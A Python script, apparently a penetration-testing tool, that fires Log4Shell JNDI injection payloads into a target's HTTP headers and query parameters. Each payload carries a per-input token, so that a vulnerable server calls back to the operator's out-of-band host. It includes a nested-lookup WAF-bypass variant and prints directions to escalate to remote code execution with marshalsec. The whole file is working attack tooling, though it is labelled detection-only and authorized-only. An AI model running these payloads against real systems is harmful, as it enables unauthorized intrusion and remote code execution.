#!/usr/bin/env python3
"""
jndi_probe.py - spray ${jndi:} into a target's headers/params with a PER-INPUT token (authorized only).

This is a DETECTION tool: it fires benign ${jndi:<proto>://<label>-<nonce>.<your-oob>/} probes (each input gets its
own self-labelling token) so that when your OOB (interactsh/Collaborator) receives a DNS/LDAP callback, the token
tells you EXACTLY which input is a live JNDI/Log4Shell sink. It never delivers a gadget. A target-sourced callback
carrying your token is the blind-RCE proof (JNDI_TESTING_GUIDE.md §4-§5/§16). RCE delivery = marshalsec /
JNDI-Injection-Exploit on authorized engagements only (§10) - one benign command, then STOP.

Usage:
  python3 jndi_probe.py -u https://target/login --oob id.oast.fun
  python3 jndi_probe.py -u "https://target/api?q=1" --oob id.oast.fun --params q,user --dns --style obf
"""
import sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass
import argparse, re, secrets, urllib.request, urllib.error
from urllib.parse import urlsplit, urlunsplit, urlencode, parse_qsl

UA_FALLBACK = "Mozilla/5.0 (compatible; jndi-probe/1.0)"
DEFAULT_HEADERS = [
    "User-Agent", "Referer", "X-Forwarded-For", "X-Api-Version", "X-Forwarded-Host",
    "X-Real-IP", "True-Client-IP", "Origin", "X-Requested-With", "Forwarded", "Authorization",
]


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


_OPENER = urllib.request.build_opener(_NoRedirect)


def label(name):
    return re.sub(r"[^a-z0-9]", "", name.lower()) or "x"


def payload(host, proto, style):
    base = f"{proto}://{host}/a"
    if style == "obf":
        return "${${lower:j}ndi:" + base + "}"       # nested lookup rebuilds 'jndi'
    return "${jndi:" + base + "}"


def token_host(name, oob):
    return f"{label(name)}-{secrets.token_hex(3)}.{oob}"


def fetch(url, headers, timeout):
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        r = _OPENER.open(req, timeout=timeout)
        return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return None


def set_param(url, param, value):
    s = urlsplit(url)
    q = dict(parse_qsl(s.query, keep_blank_values=True))
    q[param] = value
    return urlunsplit((s.scheme, s.netloc, s.path or "/", urlencode(q), s.fragment))


def main():
    ap = argparse.ArgumentParser(description="Per-input ${jndi:} sprayer (detection; authorized only).")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--oob", required=True, help="YOUR interactsh/Collaborator host")
    ap.add_argument("--headers", help="comma-separated header names (default: high-yield list)")
    ap.add_argument("--params", help="comma-separated query params to test")
    ap.add_argument("-H", "--header", action="append", default=[], help="extra STATIC header 'Name: value'")
    ap.add_argument("--dns", action="store_true", help="use dns:// (egress-friendly, stealthiest) instead of ldap://")
    ap.add_argument("--style", choices=["plain", "obf"], default="plain", help="obf = nested-lookup WAF bypass")
    ap.add_argument("--timeout", type=float, default=15.0)
    a = ap.parse_args()

    proto = "dns" if a.dns else "ldap"
    static = {"User-Agent": UA_FALLBACK}
    for hh in a.header:
        if ":" in hh:
            k, v = hh.split(":", 1)
            static[k.strip()] = v.strip()
    hdr_names = [x.strip() for x in a.headers.split(",")] if a.headers else DEFAULT_HEADERS
    param_names = [x.strip() for x in a.params.split(",")] if a.params else []

    print("== JNDI/Log4Shell probe ==   [detection: watch your OOB for token-carrying callbacks]")
    print(f"[i] target: {a.url}   oob: {a.oob}   proto: {proto}   style: {a.style}")

    fired = 0
    for name in hdr_names:
        host = token_host(name, a.oob)
        code = fetch(a.url, {**static, name: payload(host, proto, a.style)}, a.timeout)
        fired += 1
        print(f"  [fired] header {name:18} token {host}   (status {code})")
    for p in param_names:
        host = token_host("param-" + p, a.oob)
        code = fetch(set_param(a.url, p, payload(host, proto, a.style)), dict(static), a.timeout)
        fired += 1
        print(f"  [fired] param  {p:18} token {host}   (status {code})")

    print()
    print(f"[i] {fired} probe(s) fired. Watch your OOB ({a.oob}) for a DNS/LDAP callback from the TARGET's egress")
    print("    carrying one of the tokens above -> that exact input is a live JNDI/Log4Shell sink (blind RCE, Critical).")
    print("    Then (authorized) escalate per guide §8-§10 with marshalsec/JNDI-Injection-Exploit - one benign id, STOP.")
    print("    Blocked? re-run with --style obf (WAF bypass) and/or --dns (egress-friendly). Reflection alone != a finding (§16).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
